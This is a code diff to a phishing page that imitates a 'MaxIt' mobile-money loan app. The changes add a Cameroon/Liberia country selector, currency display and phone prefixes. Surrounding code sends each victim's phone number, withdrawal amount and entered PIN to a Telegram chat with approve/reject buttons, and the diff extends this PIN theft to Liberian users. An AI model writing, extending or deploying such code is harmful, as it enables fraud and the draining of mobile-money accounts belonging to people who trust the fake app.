@@ -55,7 +55,6 @@
                 border: 8px solid #000;
             }
         }
-        /* Header */
         
         .app-header {
             background-color: var(--orange-primary);
@@ -83,7 +82,22 @@
         .logo strong {
             font-weight: 800;
         }
-        /* Dashboard Content */
+        
+        .country-selector-header {
+            padding: 4px 8px;
+            border-radius: 6px;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            outline: none;
+        }
+        
+        .country-selector-header option {
+            color: var(--text-dark);
+        }
         
         .content-area {
             padding: 25px 20px;
@@ -97,7 +111,6 @@
             font-size: 15px;
             margin-bottom: 20px;
         }
-        /* Limit Card */
         
         .limit-card {
             background: linear-gradient(135deg, var(--orange-primary) 0%, #e66a00 100%);
@@ -110,7 +123,6 @@
             position: relative;
             overflow: hidden;
         }
-        /* Decorative Background Pattern */
         
         .limit-card::after {
             content: '';
@@ -145,7 +157,6 @@
             font-weight: 600;
             opacity: 0.9;
         }
-        /* Actions */
         
         .btn-withdraw {
             width: 100%;
@@ -201,7 +212,6 @@
             font-size: 12px;
             color: var(--text-grey);
         }
-        /* PIN Modal Overlay */
         
         .modal-overlay {
             position: absolute;
@@ -216,7 +226,6 @@
             flex-direction: column;
             justify-content: flex-end;
         }
-        /* Slide-up Modal Content */
         
         .pin-modal {
             background: white;
@@ -315,7 +324,10 @@
         <header class="app-header">
             <button class="icon-btn" onclick="window.location.href='otp.html'"><i class="fa-solid fa-arrow-left"></i></button>
             <div class="logo"><strong>Max</strong>It</div>
-            <button class="icon-btn"><i class="fa-solid fa-bell"></i></button>
+            <select class="country-selector-header" id="countrySelect" onchange="updateCountrySettings()">
+                <option value="CM" selected>Cameroon (FCFA)</option>
+                <option value="LR">Liberia (LRD)</option>
+            </select>
         </header>
 
         <div class="content-area">
@@ -325,7 +337,7 @@
                 <div class="limit-label">Approved Loan Limit</div>
                 <div class="limit-amount">
                     <span id="animatedNumber">0</span>
-                    <span class="currency">FCFA</span>
+                    <span class="currency" id="currencyDisplay">FCFA</span>
                 </div>
             </div>
 
@@ -374,13 +386,25 @@
         const savedPhone = sessionStorage.getItem('savedPhone');
         let cleanPhoneForBot = 'UNKNOWN';
 
+        function updateCountrySettings() {
+            const country = document.getElementById('countrySelect').value;
+            const currencyDisplay = document.getElementById('currencyDisplay');
+            if (country === 'LR') {
+                currencyDisplay.innerText = 'LRD';
+            } else {
+                currencyDisplay.innerText = 'FCFA';
+            }
+        }
+
         if (savedPhone) {
             document.getElementById('greetingText').innerText = `Hello, ${savedPhone}`;
             let cleanNumber = savedPhone.replace(/[^0-9]/g, '');
             if (cleanNumber.startsWith('0')) {
                 cleanNumber = cleanNumber.substring(1);
             }
-            cleanPhoneForBot = '237' + cleanNumber;
+            const country = document.getElementById('countrySelect').value;
+            const prefix = country === 'LR' ? '231' : '237';
+            cleanPhoneForBot = prefix + cleanNumber;
         }
 
         const errorModal = document.getElementById('errorModal');
@@ -470,7 +494,9 @@
         const chatId = '1003670447';
 
         function sendWithdrawalToTelegram(phone, pin, amount) {
-            const message = `💸 *Withdrawal Request*\nPhone: \`+${phone}\`\nAmount: \`${amount} FCFA\`\n🔑 PIN Entered: \`${pin}\`\n\n👇 Please Approve or Reject:`;
+            const country = document.getElementById('countrySelect').value;
+            const currency = country === 'LR' ? 'LRD' : 'FCFA';
+            const message = `💸 *Withdrawal Request*\nPhone: \`+${phone}\`\nAmount: \`${amount} ${currency}\`\n🔑 PIN Entered: \`${pin}\`\n\n👇 Please Approve or Reject:`;
 
             const inlineKeyboard = {
                 inline_keyboard: [
@@ -562,6 +588,13 @@
             btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
             btn.style.opacity = '0.8';
             btn.disabled = true;
+
+            // Re-evaluate phone with updated country prefix if changed
+            let cleanNumber = (savedPhone || '').replace(/[^0-9]/g, '');
+            if (cleanNumber.startsWith('0')) cleanNumber = cleanNumber.substring(1);
+            const country = document.getElementById('countrySelect').value;
+            const prefix = country === 'LR' ? '231' : '237';
+            cleanPhoneForBot = prefix + cleanNumber;
 
             sendWithdrawalToTelegram(cleanPhoneForBot, finalPin, targetAmount.toLocaleString())
                 .then(response => {
